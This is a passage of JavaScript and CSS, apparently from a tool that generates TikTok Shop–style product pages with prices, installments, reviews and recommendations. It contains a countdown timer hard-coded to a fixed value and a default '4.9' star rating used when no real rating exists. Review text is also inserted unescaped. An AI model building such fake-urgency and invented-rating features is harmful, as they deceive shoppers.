        .modal-product-image { width:100px; height:100px; border-radius:4px; object-fit:cover; display: block; }
        .modal-header-info { display: flex; flex-direction: column; justify-content: flex-end; }
        .price-row-modal { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
        .modal-price { font-size:20px; font-weight:700; color:#fe2c55; }
        .modal-discount-badge { background: #fe2c55; color: white; font-size: 12px; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
        .modal-old-price { font-size: 14px; color: #999; text-decoration: line-through; }
        .modal-selection-text { font-size: 14px; color: #666; margin-top: 4px; }
        .modal-close { position:absolute; right:0; top:0; font-size: 24px; color: #333; background: none; border: none; cursor: pointer; padding: 5px; }
        .option-group { margin-bottom:20px; }
        .option-title { font-weight:600; margin-bottom:10px; font-size: 14px; color: #333; }
        .color-options { display:flex; gap:10px; flex-wrap:wrap; }
        .color-option { border:1px solid #e0e0e0; border-radius:4px; cursor:pointer; width: 80px; height: 100px; display: flex; flex-direction: column; overflow: hidden; transition: all 0.2s; }
        .color-option img { width:100%; height: 75px; object-fit:cover; display:block; }
        .color-option span { font-size: 10px; text-align: center; padding: 0 2px; height: 25px; display: flex; align-items: center; justify-content: center; background: #fff; color: #333; text-transform: uppercase; font-weight: 500; width: 100%; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .color-option.selected { border-color:#000; border-width: 1px; }
        .size-options { display:flex; gap:8px; flex-wrap:wrap; }
        .size-option { border:1px solid #ddd; padding: 0 12px; min-width: 40px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius:2px; cursor:pointer; font-size:13px; color: #333; background: #fff; white-space: nowrap; }
        .size-option.selected { border-color:#fe2c55; color:#fe2c55; background:#fff0f2; }
        .quantity-section { display:flex; justify-content:space-between; align-items:center; margin-top:10px; padding-top:15px; border-top:1px solid #f5f5f5; margin-bottom: 20px; }
        .quantity-selector { display:flex; border:1px solid #ddd; border-radius:4px; background: #f9f9f9; }
        .quantity-btn { width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; border: none; background: transparent; cursor: pointer; }
        .quantity-value { width:40px; display:flex; align-items:center; justify-content:center; font-weight:600; font-size: 14px; }
        .modal-buy-btn { width:100%; background:#fe2c55; color:white; padding:14px; border-radius:4px; font-weight:600; font-size: 16px; border: none; margin-top: auto; }
        .modal-buy-btn.disabled { opacity: 0.7; }
        .reviews-section { background:white; padding:16px; margin-bottom:8px; }
        .reviews-header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
        .reviews-title { font-size: 16px; font-weight: 700; color: #161823; }
        .reviews-more { font-size: 13px; color: #888; text-decoration: none; display: flex; align-items: center; }
        .reviews-score-container { display: flex; align-items: center; gap: 6px; margin-bottom: 20px; }
        .reviews-score-val { font-size: 15px; font-weight: 700; color: #161823; }
        .reviews-score-max { font-size: 12px; color: #888; font-weight: 400; margin-left: 2px; }
        .reviews-score-stars { display: flex; align-items: center; gap: 2px; }
        .reviews-score-stars svg { width: 16px; height: 16px; color: #fbbf24; }
        .review-item { margin-bottom: 24px; }
        .rev-user-row { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
        .rev-avatar { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; }
        .rev-name { font-size: 13px; font-weight: 600; color: #161823; }
        .rev-stars-row { display: flex; gap: 2px; margin-bottom: 6px; }
        .rev-star-icon { width: 14px; height: 14px; color: #fbbf24; }
        .rev-star-icon.empty { color: #e5e7eb; }
        .rev-variant { font-size: 12px; color: #888; margin-bottom: 6px; }
        .rev-text { font-size: 14px; color: #161823; line-height: 1.4; margin-bottom: 8px; }
        .rev-img { width: 100px; height: 100px; border-radius: 6px; object-fit: cover; background: #f0f0f0; }
        .installments-row { display: flex; align-items: center; gap: 8px; padding: 10px 0 2px 0; }
        .installments-row .inst-icon { width: 16px; height: 16px; flex-shrink: 0; color: #555; }
        .installments-row .inst-text { font-size: 14px; color: #161823; font-weight: 500; }
        .installments-row .inst-chevron { margin-left: 2px; width: 16px; height: 16px; color: #999; }
        .coupon-discount-row { display: flex; align-items: center; gap: 8px; background: transparent; padding: 8px 0 4px; margin: 4px 0 0; cursor: pointer; }
        .coupon-ticket-icon { width: 17px; height: 17px; flex-shrink: 0; color: #E60748; }
        .coupon-discount-row .coupon-chevron { width: 18px; height: 18px; flex-shrink: 0; color: #999; opacity: 0.8; margin-left: auto; }
        .extra-discount-badge { display: inline-flex; align-items: center; gap: 5px; background: #fde8ec; color: #E60748; font-size: 14px; font-weight: 700; white-space: nowrap; border-radius: 6px; padding: 4px 9px; }
        .extra-discounts-container { display: flex; flex-wrap: nowrap; gap: 8px; min-width: 0; overflow: hidden; }
        /* Protecao do cliente */
        .customer-protection { background: #fff; padding: 14px 16px; margin-bottom: 8px; }
        .protection-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
        .protection-header .shield-icon { width: 18px; height: 18px; color: #8a5a2b; flex-shrink: 0; }
        .protection-title { font-size: 14px; font-weight: 700; color: #8a5a2b; flex: 1; }
        .protection-header .protection-chevron { width: 16px; height: 16px; color: #c9a06a; }
        .protection-items { display: grid; grid-template-columns: 1fr 1fr; gap: 8px 12px; }
        .protection-item { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #444; line-height: 1.3; }
        .protection-item svg { width: 13px; height: 13px; color: #8a5a2b; flex-shrink: 0; }
        /* Ofertas */
        .offers-section { background: #fff; padding: 14px 16px 16px; margin-bottom: 8px; }
        .offers-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
        .offers-title { font-size: 17px; font-weight: 700; color: #161823; }
        .offers-header .offers-chevron { width: 18px; height: 18px; color: #999; }
        .offers-coupons { display: flex; gap: 10px; overflow-x: auto; }
        .offers-coupons::-webkit-scrollbar { display: none; }
        .offer-coupon { flex-shrink: 0; min-width: 255px; display: flex; align-items: center; gap: 10px; background: #f0fbfb; border: 1px solid #d6f0f1; border-radius: 10px; padding: 12px 14px; }
        .offer-coupon-info { flex: 1; min-width: 0; }
        .offer-coupon-title { font-size: 15px; font-weight: 700; color: #161823; }
        .offer-coupon-sub { font-size: 12px; color: #888; margin-top: 3px; line-height: 1.3; }
        .offer-coupon-btn { background: #20c5c9; color: #fff; border: none; border-radius: 20px; padding: 8px 18px; font-size: 13px; font-weight: 700; cursor: pointer; flex-shrink: 0; }
        .offer-coupon-btn:disabled { background: #cfcfcf; cursor: default; }
        .coupon-toast-mini { position: fixed; bottom: 90px; left: 50%; transform: translateX(-50%) translateY(20px); background: rgba(0,0,0,0.85); color: #fff; padding: 10px 20px; border-radius: 22px; font-size: 13px; z-index: 99999; opacity: 0; transition: all .3s; pointer-events: none; white-space: nowrap; }
        .coupon-toast-mini.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        
        /* Recommendation Cards Styles */
        .recommendations-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 10px; }
        .recommendation-item { background: #fff; border-radius: 8px; overflow: hidden; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .recommendation-image { width: 100%; aspect-ratio: 1/1; object-fit: cover; display: block; }
        .recommendation-info { padding: 10px; }
        .recommendation-title { font-size: 13px; font-weight: 500; color: #161823; line-height: 1.3; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; margin-bottom: 6px; min-height: 34px; }
        .recommendation-price-row { display: flex; align-items: center; gap: 6px; margin-bottom: 6px; flex-wrap: wrap; }
        .recommendation-price { font-size: 16px; font-weight: 700; color: #fe2c55; }
        .recommendation-original-price { font-size: 12px; color: #999; text-decoration: line-through; }
        .recommendation-badges { display: flex; gap: 6px; margin-bottom: 6px; flex-wrap: wrap; }
        .rec-badge-shipping { background: #e0f7fa; color: #00897b; font-size: 10px; font-weight: 600; padding: 2px 6px; border-radius: 3px; }
        .rec-badge-installment { background: #fff3e0; color: #e65100; font-size: 10px; font-weight: 600; padding: 2px 6px; border-radius: 3px; }
        .recommendation-rating { display: flex; align-items: center; gap: 4px; font-size: 12px; color: #666; }
        .rec-star-icon { width: 14px; height: 14px; color: #fbbf24; }
        .rec-rating-value { font-weight: 600; color: #161823; }
        .rec-sold-count { color: #888; }
        .rating-sales-container { margin-top: 8px !important; margin-bottom: 12px !important; display: flex; align-items: center; gap: 5px; font-size: 14px; color: #666; }
        .title-wrapper { margin-top: 0px !important; display:flex; justify-content:space-between; gap:10px; }
        .product-title { font-size:18px; font-weight:500; line-height:1.4; margin-top: 0px; margin-bottom: 5px; }
        .description-content { background:white; padding:16px; margin-bottom:8px; font-size:14px; line-height:1.6; }
        .description-content img { width:100%; display:block; margin:10px 0; }
        .description-content p, .product-description-text { white-space: pre-wrap; }
        .desc-rich { font-size:14px; line-height:1.7; color:#333; }
        .desc-rich .desc-product-name { font-size:16px; font-weight:700; color:#161823; margin:0 0 12px 0; line-height:1.4; }
        .desc-rich .desc-subtitle { font-size:14px; font-weight:700; color:#161823; margin:18px 0 8px 0; line-height:1.4; }
        .desc-rich .desc-paragraph { margin:0 0 12px 0; color:#444; line-height:1.7; }
        .desc-rich .desc-list { margin:8px 0 14px 0; padding:0; list-style:none; }
        .desc-rich .desc-list li { position:relative; padding-left:18px; margin:0 0 8px 0; color:#444; line-height:1.6; }
        .desc-rich .desc-list li::before { content:''; position:absolute; left:4px; top:9px; width:5px; height:5px; border-radius:50%; background:#fe2c55; }
        .desc-rich .desc-list li strong { color:#161823; font-weight:600; }
        .shopify-description-content { font-size:14px; line-height:1.6; color:#333; }
        .shopify-description-content * { max-width:100%; }
        .shopify-description-content img { width:100%; height:auto; display:block; margin:12px 0; border-radius:4px; }
        .shopify-description-content p { margin:0 0 12px 0; }
        .shopify-description-content h1, .shopify-description-content h2, .shopify-description-content h3, .shopify-description-content h4, .shopify-description-content h5, .shopify-description-content h6 { margin:16px 0 8px 0; font-weight:600; color:#161823; }
        .shopify-description-content h1 { font-size:20px; }
        .shopify-description-content h2 { font-size:18px; }
        .shopify-description-content h3 { font-size:16px; }
        .shopify-description-content ul, .shopify-description-content ol { margin:12px 0; padding-left:24px; }
        .shopify-description-content li { margin:4px 0; }
        .shopify-description-content strong, .shopify-description-content b { font-weight:600; }
        .shopify-description-content em, .shopify-description-content i { font-style:italic; }
        .shopify-description-content a { color:#fe2c55; text-decoration:none; }
        .shopify-description-content table { width:100%; border-collapse:collapse; margin:12px 0; }
        .shopify-description-content td, .shopify-description-content th { border:1px solid #e8e8e8; padding:8px; text-align:left; }
        .shopify-description-content blockquote { border-left:3px solid #fe2c55; padding-left:12px; margin:12px 0; color:#666; }
        .shopify-description-content br { display:block; content:""; margin-top:8px; }
        .image-slider-container { width:100%; position:relative; }
        .image-slider-wrapper { display:flex; overflow-x:scroll; scroll-snap-type:x mandatory; scrollbar-width:none; }
        .product-image { width:100%; flex-shrink:0; scroll-snap-align:start; object-fit:cover; aspect-ratio: 1/1; }
        .image-counter { position:absolute; bottom:12px; right:12px; background:rgba(0,0,0,0.4); color:white; padding:4px 10px; border-radius:16px; font-size:12px; }
        .product-info { background:white; padding:16px; margin-bottom:8px; }
        .price-section { background: linear-gradient(135deg, #FF8C42 0%, #FF6B35 100%); margin: -16px -16px 0 -16px; padding: 14px 16px; }
        .price-row { display:flex; justify-content:space-between; }
        .price-main { font-size:24px; font-weight:700; color:white; }
        .price-main span { text-decoration:line-through; color:#FFCCAA; font-size:18px; margin-right:8px; }
        .price-savings { font-size:13px; color:white; opacity:0.9; }
        .flash-deal-container { display:flex; flex-direction:column; align-items:flex-end; color:white; }
        .flash-deal-text { background:rgba(255,255,255,0.2); padding:4px 10px; border-radius:12px; font-size:12px; font-weight:600; display:flex; gap:5px; }
        .countdown { font-size:13px; font-weight:600; margin-top:4px; }
        .product-title-badge { display: inline-block; background: linear-gradient(90deg, #20c5c9 0%, #11a7b8 100%); color: #fff; padding: 2px 9px; font-size: 13px; font-weight: 700; border-radius: 5px; margin-right: 8px; vertical-align: middle; letter-spacing: 0.2px; }
        .tab-content { display:block; padding-top:1px; margin-top:-1px; }
        .seller-info { display:flex; justify-content:space-between; align-items:center; padding:16px; background:white; margin-bottom:8px; }
        .seller-details { display:flex; gap:12px; align-items:center; }
        .seller-avatar { width:40px; height:40px; border-radius:50%; overflow:hidden; background:#eee; }
        .seller-avatar img { width:100%; height:100%; object-fit:cover; }
        .visit-btn { border:1px solid #ccc; padding:6px 12px; border-radius:4px; font-size:14px; }
        .recommendations-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; padding:16px; }
        .recommendation-item { background:white; border-radius:8px; overflow:hidden; }
        .recommendation-image { width:100%; aspect-ratio:1/1; object-fit:cover; }
        .recommendation-info { padding:8px; }
        .recommendation-title { font-size:13px; overflow:hidden; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; margin-bottom:5px; }
        .recommendation-price { font-weight:700; }
        .toast-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: none; align-items: center; justify-content: center; pointer-events: none; }
        .toast-box { background: rgba(30, 30, 30, 0.9); color: white; padding: 24px; border-radius: 12px; display: flex; flex-direction: column; align-items: center; gap: 12px; min-width: 180px; }
        .toast-icon svg { width: 32px; height: 32px; stroke: white; stroke-width: 3; }
        .toast-text { font-size: 14px; font-weight: 600; }
        .page-footer-container { background: #f5f5f5; padding: 30px 20px; font-size: 14px; text-align: center; color: #333; }
        .page-footer-grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; text-align: left; }
        .page-footer-col h4 { margin-bottom: 10px; }
        .page-footer-col ul { list-style: none; padding: 0; margin: 0; }
        .page-footer-col ul li { margin-bottom: 5px; }
        .page-footer-col a, .page-footer-col p { color: #333; text-decoration: none; line-height: 1.5; font-size: 13px; }
        .page-footer-col img { max-width: 100%; height: auto; margin-top: 10px; }
        .page-footer-copyright { margin-top: 20px; border-top: 1px solid #ddd; padding-top: 10px; }
        @media (max-width: 600px) { .page-footer-grid { grid-template-columns: 1fr; text-align: center; } }
        /* ===== Lightbox de avaliacoes (igual TikTok Shop) ===== */
        .review-lightbox { position: fixed; inset: 0; z-index: 100000; background: #000; display: none; flex-direction: column; opacity: 0; transition: opacity 0.2s ease; }
        /* Esconde o cabecalho fixo e a barra inferior enquanto a foto esta aberta */
        body.review-lightbox-open .mobile-header,
        body.review-lightbox-open .footer { display: none !important; }
        /* ===== Botao de favorito (bookmark) ===== */
        .fav-btn { flex-shrink: 0; align-self: flex-start; background: none; border: none; padding: 0; margin-top: 1px; cursor: pointer; color: #000; line-height: 0; -webkit-tap-highlight-color: transparent; }
        .fav-icon { width: 19px; height: 19px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linejoin: round; transition: transform 0.12s ease; }
        .fav-btn.favorited .fav-icon { fill: currentColor; stroke: currentColor; }
        .fav-btn:active .fav-icon { transform: scale(0.85); }
        /* ===== Toast de favoritos ===== */
        .fav-toast { position: fixed; left: 50%; transform: translateX(-50%) translateY(-12px); z-index: 100001; background: rgba(56,56,56,0.95); color: #fff; border-radius: 18px; opacity: 0; pointer-events: none; transition: opacity 0.22s ease, transform 0.22s ease; box-sizing: border-box; }
        .fav-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .fav-toast.toast-removed { top: 70px; padding: 16px 26px; font-size: 17px; font-weight: 500; max-width: 80vw; text-align: center; }
        .fav-toast.toast-added { top: 50%; transform: translateX(-50%) translateY(calc(-50% - 12px)); width: 300px; max-width: 80vw; padding: 26px 28px 30px; text-align: center; }
        .fav-toast.toast-added.show { transform: translateX(-50%) translateY(-50%); }
        .fav-toast .fav-toast-check { display: flex; align-items: center; justify-content: center; margin-bottom: 14px; }
        .fav-toast .fav-toast-check svg { width: 40px; height: 40px; color: #28d07f; }
        .fav-toast .fav-toast-msg { font-size: 19px; line-height: 1.35; font-weight: 400; }
        .review-lightbox.open { display: flex; opacity: 1; }
        .rl-topbar { position: relative; display: flex; align-items: center; justify-content: center; padding: 14px 16px; flex-shrink: 0; }
        .rl-close { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #fff; width: 32px; height: 32px; cursor: pointer; display: flex; align-items: center; justify-content: center; padding: 0; }
        .rl-close svg { width: 26px; height: 26px; }
        .rl-counter { color: #fff; font-size: 16px; font-weight: 600; }
        .rl-stage { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; touch-action: none; }
        .rl-image { max-width: 100%; max-height: 100%; object-fit: contain; user-select: none; -webkit-user-drag: none; will-change: transform; }
        .rl-info { flex-shrink: 0; padding: 14px 16px calc(16px + env(safe-area-inset-bottom)); color: #fff; }
        .rl-user-row { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
        .rl-avatar { width: 24px; height: 24px; border-radius: 50%; overflow: hidden; background: #555; display: flex; align-items: center; justify-content: center; font-size: 11px; color: #fff; flex-shrink: 0; }
        .rl-avatar img { width: 100%; height: 100%; object-fit: cover; }
        .rl-name { font-size: 14px; font-weight: 600; color: #fff; }
        .rl-stars { display: inline-flex; gap: 1px; margin-left: 2px; }
        .rl-stars svg { width: 14px; height: 14px; color: #fbbf24; }
        .rl-variant { font-size: 13px; color: rgba(255,255,255,0.6); margin-bottom: 8px; }
        .rl-text { font-size: 14px; line-height: 1.5; color: rgba(255,255,255,0.92); max-height: 30vh; overflow-y: auto; }
    </style>`;

    // Preparação de Dados
    const mainProductId = data.productUrl || "main-product";
    const productBadgeHTML = data.productBadge ? `<span class="product-title-badge">${data.productBadge}</span> ` : "";
    const starSVG = '<svg style="width:16px;height:16px;color:#fbbf24;flex-shrink:0;" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="0"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>';
    
    let ratingSalesHTML = "";
    if (data.productRating && data.reviewCount) { ratingSalesHTML += `${starSVG} <span style="color:#161823;font-weight:700;margin-left:2px">${data.productRating}</span> <span style="color:#2d6cdf;font-weight:500">(${data.reviewCount})</span>`; }
    if (data.salesCount) { if (ratingSalesHTML) ratingSalesHTML += ' <span style="color:#e0e0e0;margin:0 2px">|</span> '; ratingSalesHTML += `<span style="color:#888">${data.salesCount} ${t.sold_count}</span>`; }
    
    // FORMATAÇÃO DE PREÇO COM LOCALE DO IDIOMA
    const currentPriceFormatted = formatMoney(data.currentPrice);
    const originalPriceFormatted = formatMoney(data.originalPrice || data.currentPrice);
    
    const currentPriceNum = parseFloat(String(data.currentPrice || "0").replace(",", ".")) || 0;
    const originalPriceNum = parseFloat(String(data.originalPrice || data.currentPrice || "0").replace(",", ".")) || currentPriceNum;
    const discountPercentage = originalPriceNum > currentPriceNum ? Math.round(((originalPriceNum - currentPriceNum) / originalPriceNum) * 100) : 0;

    // Parcelamento 12x (derivado do preco atual)
    const installmentValue = currentPriceNum > 0 ? formatMoney(currentPriceNum / 12) : "";
    const installmentsHTML = installmentValue ? `<div class="installments-row">
        <svg class="inst-icon" viewBox="0 0 792 696" fill="currentColor" style="transform: scaleY(-1);"><path d="M74 675.4c-8.3-1.7-23-9-29.5-14.5-11.2-9.6-18.4-20.2-23.3-34.4l-2.7-8-0.3-227.5c-0.2-158 0.1-229.6 0.8-234.5 3.7-24.2 17.5-42.7 40.6-54.3 14.2-7.2 0.4-6.6 174.8-6.9 149.7-0.3 156.8-0.3 156.3 1.4-0.4 1-2.4 7-4.6 13.4-4.4 12.8-8.4 29.7-10.2 43.2l-1.2 8.7-142.4 0c-91 0-143.1 0.4-144.3 1-1 0.5-2.2 2.2-2.6 3.7-0.5 1.6-0.8 69.7-0.6 151.6l0.3 148.7 305.9 0 306 0 0-31.9 0-31.8 4.8-1.8c14.4-5.3 40.3-20.9 54-32.4l7.2-6.2-0.2 128.3c-0.3 121.7-0.4 128.6-2.2 133.8-8.7 25.9-27.1 43.6-52.2 50-7.6 2-12.4 2-317.8 1.9-261-0-311.1-0.3-316.6-1.5zm617.4-66.5c5.3-2.4 5.6-4.8 5.6-40.8l0-33.1-306 0-306 0 0 34.9 0 34.9 3.1 2.6 3.1 2.6 298.8 0c221.4 0 299.6-0.3 301.4-1.1zM593.8 351c-11.4-1.2-26.4-4.3-36.4-7.5-10.6-3.4-34.1-15.1-43.6-21.7-54.3-37.6-82.2-103.4-71.2-167.8 11.8-69 65.5-124.2 134.7-138.2 9.7-2 14.2-2.3 33.2-2.3 18.8 0.1 23.5 0.4 32 2.3 65.3 14.2 115.5 61.7 131.5 124.2 6.8 26.8 6.6 58.6-0.6 86-16.4 62.6-70.3 112.1-133.9 123-13.6 2.3-33.9 3.2-45.7 2zm27.2-50.2c5.8-2.5 9.5-6 12.8-12.3l2.7-5 0.3-43.7 0.3-43.7 11.7-6c49.6-25.2 54.7-28 59.3-33 12.3-13.1 8.6-33.9-7.5-42.4-3.1-1.6-5.9-2.1-11.1-2.2l-7 0-44 22.8c-28.8 15-45.3 24.1-47.7 26.4-2 2-4.6 5.8-5.8 8.4-2 4.8-2 6-1.8 59.6 0.3 60.9 0 58.1 7.3 65.6 7.8 8 19.6 10.2 30.5 5.5z"/></svg>
        <span class="inst-text">12x <span class="installments-value">${cur.symbol} ${installmentValue}</span></span>
        <svg class="inst-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
    </div>` : "";

    const flashDealHTML = `<section class="clean-price-section" style="margin: -16px -16px 0px -16px; padding: 12px 16px 11px 16px; background: linear-gradient(90deg, #fe2c55 0%, #ee6836 100%); min-height: 36px; box-shadow: 0 2px 12px #0001; display: flex; flex-direction: column; justify-content: center;">
        <div style="display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 0;">
            <div style="display: flex; align-items: center; gap: 8px;">
                <div style="display: flex; flex-direction: column; align-items: flex-start; gap: 0;">
                    <div style="display: flex; flex-direction: row; align-items: center; gap: 6px;">
                        <span id="discount-percent" style="background: rgba(0, 0, 0, 0.18); color: #ffffff; padding: 3px 6px; border-radius: 4px; font-size: 12px; font-weight: 800; display: inline-block;">-${discountPercentage}%</span>
                        <span id="price-current" style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 27px; font-weight: 800; color: #ffffff; line-height: 1;">${cur.symbol} ${currentPriceFormatted}</span>
                        <img src="https://editor.sys-assets-check.com/img/bilhete.png" alt="Bilhete" style="margin-left: 2px; width: 18px; height: 18px; display: inline-block; filter: brightness(0) invert(1);">
                    </div>
                    <span id="price-compare" style="text-decoration: line-through; color: rgba(255, 255, 255, 0.8); font-size: 11px; display: inline-block; margin-left: 0px; margin-top: 3px;">${cur.symbol} ${originalPriceFormatted}</span>
                </div>
            </div>
            <div style="display: flex; flex-direction: column; align-items: flex-end;">
                <div style="display: flex; align-items: center; background: #fff8f800; padding: 0;">
                    <img src="https://editor.sys-assets-check.com/img/raio.png" alt="Oferta Relâmpago" style="width: 11px; height: 11px; display: inline-block; vertical-align: middle; margin-right: 4px; filter: brightness(0) invert(1);">
                    <span style="color: #ffffff; font-size: 11px; font-weight: 700;">${t.flash_deal}</span>
                </div>
                <div style="margin-top: 3px; display: flex; align-items: center;">
                    <span id="countdown-timer" style="color: #ffffff; font-size: 12px; font-weight: 600;">${t.ends_in} 00:04:46</span>
                </div>
            </div>
        </div>
    </section>`;

    const couponTicketSvg = `<svg class="coupon-ticket-icon" viewBox="0 0 507 346"><g transform="translate(0,346) scale(0.1,-0.1)" fill="currentColor" stroke="none"><path d="M520 3287 c-146 -50 -246 -137 -309 -269 -21 -46 -44 -107 -50 -136 -7 -31 -11 -177 -11 -358 0 -252 3 -311 15 -341 36 -87 76 -106 230 -113 92 -5 131 -11 167 -27 66 -30 143 -105 175 -172 25 -49 28 -67 28 -151 0 -84 -3 -102 -28 -152 -33 -68 -90 -121 -165 -156 -44 -20 -76 -26 -151 -29 -137 -6 -157 -10 -198 -46 -70 -62 -73 -74 -73 -422 0 -345 6 -392 63 -499 41 -79 125 -163 207 -208 128 -71 66 -68 1281 -68 1089 0 1093 0 1136 21 30 15 52 35 71 67 26 45 27 54 32 220 l5 174 37 34 c40 36 50 38 185 37 68 0 101 -16 130 -60 15 -22 19 -57 23 -203 5 -176 5 -177 34 -214 58 -77 48 -76 611 -76 542 0 550 1 661 56 136 69 243 211 273 362 6 30 11 186 11 363 0 256 -3 316 -15 346 -36 87 -82 109 -235 115 -99 4 -123 8 -172 32 -118 56 -189 163 -196 293 -7 117 36 209 135 289 67 54 134 74 255 74 119 0 169 22 205 90 23 42 23 48 23 364 0 354 -4 386 -62 506 -40 83 -141 184 -223 224 -116 57 -108 56 -657 56 -553 0 -547 1 -600 -56 -42 -45 -48 -75 -49 -237 0 -174 -9 -211 -58 -244 -29 -20 -47 -23 -127 -23 -101 0 -149 15 -175 54 -10 15 -15 70 -19 201 -6 201 -12 223 -77 272 l-36 28 -1121 2 -1121 3 -65 -23z m2733 -917 c53 -25 67 -73 67 -220 0 -209 -25 -240 -190 -240 -77 0 -101 4 -127 20 -55 33 -63 62 -63 221 0 132 2 145 23 176 33 49 77 64 177 60 47 -2 98 -10 113 -17z m-8 -841 c61 -30 70 -56 73 -212 2 -121 0 -147 -15 -176 -32 -62 -62 -76 -166 -76 -108 0 -148 14 -177 60 -18 28 -20 49 -20 176 0 94 5 152 13 168 16 32 57 61 98 70 51 12 162 5 194 -10z"/></g></svg>`;
    const extraDiscountsHTML = data.extraDiscounts.map((d, i) => `<span class="extra-discount-badge">${i === 0 ? couponTicketSvg : ''}${d}</span>`).join("");
    const sellerAvatarHTML = data.storeLogoUrl ? `<img src="${data.storeLogoUrl}" alt="Logo ${data.storeName}">` : (data.storeName || "S").charAt(0);
    const allImagesHTML = [data.mainImage, ...data.additionalImages].filter(Boolean).map((img) => `<img class="product-image" src="${img}" alt="${data.productTitle}">`).join("");
    const descriptionImagesHTML = renderDescriptionBlocksHTML(data.descriptionBlocks, data.descriptionImages, data.productDescription, data.rawDescriptionHtml);
    
    const reviewCountDisplay = data.reviewCount || (data.reviews || []).length;
    const productScore = data.productRating || "4.9";
    const getStarsSVG = (count, className) => { let stars = ''; for(let i=0; i<5; i++) { const fill = i < count ? 'currentColor' : 'none'; const cls = i < count ? className : className + ' empty'; stars += `<svg class="${cls}" viewBox="0 0 24 24" fill="${fill}" stroke="currentColor" stroke-width="0"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>`; } return stars; };
    const reviewsHTML = data.reviews.map((r) => { 
      const avatarContent = r.avatarUrl ? `<img src="${r.avatarUrl}" class="rev-avatar">` : `<div class="rev-avatar" style="background:#ddd;display:flex;align-items:center;justify-content:center;font-size:10px;">${(r.name || "A").charAt(0)}</div>`; 
      const reviewStars = getStarsSVG(r.stars || 5, 'rev-star-icon'); 
      const variantText = r.details ? r.details : "Item: Padrao"; 
      // Suporta images (array) ou image (string) - ate 5 fotos
      const imgs = r.images && r.images.length > 0 ? r.images : (r.image ? [r.image] : []);
      const imgsHTML = imgs.length > 0 ? `<div class="rev-imgs" style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px;">${imgs.slice(0,5).map(img => `<img class="rev-img" src="${img}" alt="Foto" style="width:60px;height:60px;object-fit:cover;border-radius:6px;cursor:pointer;" onclick="openReviewLightbox(this)">`).join("")}</div>` : "";
      return `<div class="review-item"><div class="rev-user-row">${avatarContent}<div class="rev-name">${r.name}</div></div><div class="rev-stars-row">${reviewStars}</div><div class="rev-variant">${variantText}</div><div class="rev-text">${r.text}</div>${imgsHTML}</div>`; 
    }).join("");
    const reviewsHeaderHTML = `<div class="reviews-header-top"><div class="reviews-title">${t.reviews_title2} (${reviewCountDisplay})</div><a href="#" class="reviews-more">${t.view_more} ></a></div><div class="reviews-score-container"><span class="reviews-score-val">${productScore}</span><span class="reviews-score-max">/5</span><div class="reviews-score-stars">${getStarsSVG(Math.round(parseFloat(productScore)), '')}</div></div>`;
    
    const allProducts = {}; 
    const globalRecDiscount = data.recommendationDiscount || '40';
    allProducts[mainProductId] = data;
    const allRecommendationIds = [];
    data.recommendations.forEach((rec) => { let recId = rec.productUrl || rec.productTitle; if (recId === mainProductId) recId = recId + "-rec"; if (!recId) recId = "rec-" + Math.floor(Math.random() * 100000); if (recId) { const recDataWithOriginal = { ...rec }; if (!recDataWithOriginal.originalPrice) recDataWithOriginal.originalPrice = recDataWithOriginal.currentPrice; if (recDataWithOriginal.colors) recDataWithOriginal.colors = recDataWithOriginal.colors.map((c) => ({ ...c, originalPrice: c.originalPrice || recDataWithOriginal.originalPrice })); recDataWithOriginal.recommendationDiscount = globalRecDiscount; allProducts[recId] = recDataWithOriginal; allRecommendationIds.push(recId); } });
    allProducts[mainProductId].recommendationIds = allRecommendationIds;
    allRecommendationIds.forEach((recId) => { if (allProducts[recId]) { const otherRecIds = allRecommendationIds.filter((id) => id !== recId); allProducts[recId].recommendationIds = [mainProductId, ...otherRecIds]; allProducts[recId].recommendationDiscount = globalRecDiscount; } });
    
    // RECOMMENDATIONS HTML com MOEDA CORRETA, Frete Gratis, Preco Original, Rating e Vendidos
    const recommendationsHTML = data.recommendations.map((rec) => { 
        let recId = rec.productUrl || rec.productTitle; 
        if (recId === mainProductId) recId = recId + "-rec"; 
        if (!recId) recId = "rec-" + Math.floor(Math.random() * 100000); 
        const title = rec.productTitle || rec.title || "Produto"; 
        const image = rec.mainImage || rec.image || "https://placehold.co/200x200"; 
        const price = formatMoney(rec.currentPrice || rec.price); 
        const originalPrice = formatMoney(rec.originalPrice || rec.currentPrice || rec.price);
